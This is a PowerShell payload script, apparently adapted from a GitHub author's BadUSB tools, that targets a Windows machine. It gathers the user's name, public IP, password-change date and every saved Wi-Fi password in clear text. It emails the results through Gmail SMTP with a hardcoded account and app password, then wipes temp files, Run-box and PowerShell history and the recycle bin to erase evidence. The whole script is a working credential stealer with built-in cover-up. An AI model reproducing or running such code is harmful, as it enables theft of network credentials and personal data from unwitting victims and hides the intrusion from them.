## I'm new to this and forgot to fork instead of retrieving the file
## Major part of this script has been made by Github user "I am Jakoby" : https://github.com/I-Am-Jakoby

New-Item $Env:temp\foo.txt -type File
<#

.NOTES  
	This will get the name associated with the microsoft account
#>

 function Get-Name {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName

}

$fn = Get-Name

echo "Hey" $fn >> $Env:temp\foo.txt

echo "`nYour computer is not very secure" >> $Env:temp\foo.txt

#############################################################################################################################################

<#

.NOTES 
	This is to get the current Latitude and Longitude of your target
#>

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

#$GL = Get-GeoLocation
#if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }


#############################################################################################################################################

<#

.NOTES  
	This will get the public IP from the target computer
#>


function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

$PubIP = Get-PubIP
if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }


###########################################################################################################

<#

.NOTES 
	Password last Set
	This function will custom tailor a response based on how long it has been since they last changed their password
#>


 function Get-Days_Set {

    #-----VARIABLES-----#
    # $pls (password last set) = the date/time their password was last changed 
    # $days = the number of days since their password was last changed 

    try {
 
    $pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
    $plsPOS = $pls.IndexOf("e")
    $pls = $pls.Substring($plsPOS+2).Trim()
    $pls = $pls -replace ".{3}$"
    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
    return $pls
    
    }
 
 # If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
    return $null
    -ErrorAction SilentlyContinue
    }
}

$pls = Get-Days_Set
if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }


###########################################################################################################

<#

.NOTES 
	All Wifi Networks and Passwords 
	This function will gather all current Networks and Passwords saved on the target computer
	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>


# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Contenu de la clé") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}
    if (!$WLANProfileObjects) { Write-Host "variable is null" 
    }else { 

	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage

	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt

$content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
	}

$PWord = ConvertTo-SecureString -String "rcotbisuqqikfaqc" -ASPlainText -Force
$User = "trashmail4demos@gmail.com"
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord

Send-MailMessage -Attachments $Env:temp\foo.txt -Body 'Jette un coup doeil a la piece jointe' -From $Credential.UserName -To "trashmail4demos@gmail.com" -SMTPServer smtp.gmail.com -UseSSL -Subject Test -Port 587 -Credential $Credential

Remove-Item $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

function clean-exfil {

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>
try {
# Delete contents of Temp folder 

	Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

	Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

	Clear-RecycleBin -Force -ErrorAction SilentlyContinue

	}


	catch {Write-Error "Can not do clean exfil" 
	return $env:UserName
	-ErrorAction SilentlyContinue
	}
}
#----------------------------------------------------------------------------------------------------
clean-exfil
 
